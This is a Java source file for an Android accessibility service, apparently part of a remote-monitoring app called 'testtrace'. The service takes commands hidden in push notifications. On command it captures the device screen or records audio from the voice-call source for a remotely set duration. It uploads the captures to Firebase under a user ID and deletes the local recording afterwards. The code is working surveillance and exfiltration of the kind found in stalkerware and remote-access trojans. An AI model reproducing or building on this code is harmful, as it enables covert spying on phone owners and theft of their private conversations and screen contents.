package com.reiserx.testtrace.Screenshot;

import android.accessibilityservice.AccessibilityServiceInfo;
import android.app.Notification;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.os.Parcelable;
import android.util.Log;
import android.view.Display;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.widget.Toast;

import androidx.annotation.NonNull;

import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.reiserx.testtrace.Classes.ExceptionHandler;
import com.reiserx.testtrace.Models.AudiosDownloadUrl;
import com.reiserx.testtrace.Models.TaskSuccess;
import com.reiserx.testtrace.Utilities.getRandom;

import java.io.File;
import java.util.Calendar;
import java.util.concurrent.Executor;

public class accessibilityService extends android.accessibilityservice.AccessibilityService {

    private static final int RECORDER_SAMPLERATE = 8000;
    private MediaRecorder recorder;

    String TAG = "ijsfnidshf";

    public static accessibilityService instance;

    FirebaseDatabase mdb;
    DatabaseReference reference;

    TaskSuccess taskSuccess;

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
        info.notificationTimeout = 100;
        setServiceInfo(info);
        Toast.makeText(this, "Service started", Toast.LENGTH_SHORT).show();
        instance = this;
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {

        if (accessibilityEvent.getPackageName().equals("com.reiserx.testtrace")) {

            if (accessibilityEvent.getEventType() == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                Log.d(TAG, "Recieved event");
                Parcelable data = accessibilityEvent.getParcelableData();
                if (data instanceof Notification) {
                    Log.d(TAG, "Recieved notification");
                    Notification notification = (Notification) data;

                    if (notification.extras.getString("android.title") != null && notification.extras.getString("android.text") != null) {

                        String title = notification.extras.getString("android.title");
                        if (title.contains("com.reiserx.testtrace.accessibility")) {
                            SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
                            String UserID = save.getString("UserID", "");

                            int message = Integer.parseInt(notification.extras.getString("android.text"));
                            Log.d(TAG, title);
                            switch (message) {
                                case 1:
                                    takeScreenshots(UserID);
                                    Log.d(TAG, String.valueOf(message));
                                    break;
                                case 2:
                                    long value = Long.parseLong(title.replaceAll("[\\D]", ""));
                                    final Handler handler = new Handler(Looper.getMainLooper());
                                    accessibilityService.instance.startRecording();
                                    handler.postDelayed(() -> accessibilityService.instance.stopRecording(UserID), value);
                                    break;
                            }
                        }
                    }
                }
            }
        }
    }

    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        int action = event.getAction();
        int keyCode = event.getKeyCode();

        if (action == KeyEvent.ACTION_UP) {
            if (keyCode == KeyEvent.KEYCODE_VOLUME_UP) {
                Log.d(TAG, "KeyUp");
                instance = this;
            } else if (keyCode == KeyEvent.KEYCODE_VOLUME_DOWN) {
                Log.d(TAG, "KeyDown");
                instance = this;
            }
        }
        return super.onKeyEvent(event);
    }

    @Override
    public void onInterrupt() {

    }

    @Override
    public void takeScreenshot(int displayId, @NonNull Executor executor, @NonNull TakeScreenshotCallback callback) {
        super.takeScreenshot(displayId, executor, callback);
    }

    public void takeScreenshots(String UserID) {

        Log.d(TAG, UserID+"tfggygyg");
        mdb = FirebaseDatabase.getInstance();
        reference = mdb.getReference().child("Main").child(UserID).child("Screenshot").child("listener");

        taskSuccess = new TaskSuccess("Capturing screenshot", true, false);
        reference.setValue(taskSuccess);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(Display.DEFAULT_DISPLAY,
                    getApplicationContext().getMainExecutor(), new TakeScreenshotCallback() {
                        @Override
                        public void onSuccess(@NonNull ScreenshotResult screenshotResult) {

                            taskSuccess.setMessage("Screenshot captured");
                            taskSuccess.setSuccess(true);
                            reference.setValue(taskSuccess);
                            Log.i("ScreenShotResult", "onSuccess");
                            Bitmap bitmap = Bitmap.wrapHardwareBuffer(screenshotResult.getHardwareBuffer(), screenshotResult.getColorSpace());
                            Log.d(TAG, String.valueOf(bitmap));

                            saveBitmap saveBitmap = new saveBitmap(bitmap, accessibilityService.instance, reference, taskSuccess);
                            String filename = getRandom.getRandom(0, 1000000000) + ".png";
                            saveBitmap.saveData(filename, UserID);
                        }

                        @Override
                        public void onFailure(int i) {

                            taskSuccess.setMessage("Capture failed " + i);
                            taskSuccess.setSuccess(false);
                            taskSuccess.setFinal(true);
                            reference.setValue(taskSuccess);
                            Log.i("ScreenShotResult", "onFailure code is " + i);

                        }
                    });
        } else {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                performGlobalAction(instance.GLOBAL_ACTION_TAKE_SCREENSHOT);
                ScreenshotObserver screenshotObserver = new ScreenshotObserver();
                screenshotObserver.Observer(UserID, taskSuccess, reference);
            }
        }
    }

    public void startRecording() {
        try {
            recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            recorder.setAudioSamplingRate(RECORDER_SAMPLERATE);
            Log.e(TAG, "test");

            final String filePath = this.getFilesDir() + "/Audios/" + "check" + ".mp3";
            final File file = new File(filePath);
            file.getParentFile().mkdirs();
            recorder.setOutputFile(filePath);

            recorder.prepare();
            recorder.start();
        } catch (Exception e) {
            e.printStackTrace();
            SharedPreferences save = getSharedPreferences("users", MODE_PRIVATE);
            String UserID = save.getString("UserID", "");
            ExceptionHandler exceptionHandler = new ExceptionHandler(e, UserID);
            exceptionHandler.upload();
        }
    }

    public void stopRecording(String UserID) {
        try {
            if (recorder != null) {
                recorder.stop();
                recorder.release();
                recorder = null;
                final String filePath = this.getFilesDir() + "/Audios/" + "check" + ".mp3";
                final File file = new File(filePath);
                updateAudioToServer(UserID, file);
            }
        } catch (Exception e) {
            e.printStackTrace();
            ExceptionHandler exceptionHandler = new ExceptionHandler(e, UserID);
            exceptionHandler.upload();
        }
    }

    public void updateAudioToServer(String UserID, File filePath) {
        FirebaseStorage storage = FirebaseStorage.getInstance();
        FirebaseFirestore firestore = FirebaseFirestore.getInstance();

        String filename = getRandom.getRandom(0, 1000000000) + ".mp3";

        DocumentReference collectionReference = firestore.collection("Main").document(UserID).collection("AudioRecordings").document(filename);
        StorageReference reference = storage.getReference().child("Main").child(UserID).child("AudioRecordings").child(filename);
        reference.putFile(Uri.fromFile(filePath)).addOnCompleteListener(task -> {
            Log.d(TAG, "uploading");
            if (task.isSuccessful()) {
                reference.getDownloadUrl().addOnSuccessListener(uri -> {
                    Log.d(TAG, "getting url");
                    Calendar cal = Calendar.getInstance();
                    long currentTime = cal.getTimeInMillis();
                    AudiosDownloadUrl downloadUrl = new AudiosDownloadUrl(uri.toString(), filename, currentTime);
                    collectionReference.set(downloadUrl).addOnSuccessListener(reference1 -> {
                        filePath.delete();
                        Log.d(TAG, String.valueOf(reference1));
                    });
                });
            }
        });
    }

}